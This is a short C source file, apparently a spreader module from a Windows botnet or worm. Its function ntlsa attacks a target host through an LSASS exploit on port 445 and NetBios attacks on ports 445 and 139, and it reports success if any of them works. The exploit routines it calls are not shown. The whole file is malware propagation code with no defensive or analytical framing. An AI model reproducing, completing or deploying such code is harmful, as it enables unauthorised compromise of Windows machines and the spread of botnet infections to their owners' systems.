#include "../header/includes.h"
#include "../header/functions.h"
#include "../header/externs.h"

#ifndef NO_NETBIOS
#ifndef NO_LSASS
#ifndef NO_NTLSA
BOOL ntlsa(EXINFO exinfo)
{
	exinfo.port = 445;
	BOOL bLSASS = lsass(exinfo);

	exinfo.port = 445;
	BOOL bNTPASS = NetBios(exinfo);

	exinfo.port = 139;
	BOOL bNETBIOS = NetBios(exinfo);


	return bLSASS || bNTPASS || bNETBIOS ? TRUE : FALSE;
}
#endif
#endif
#endif


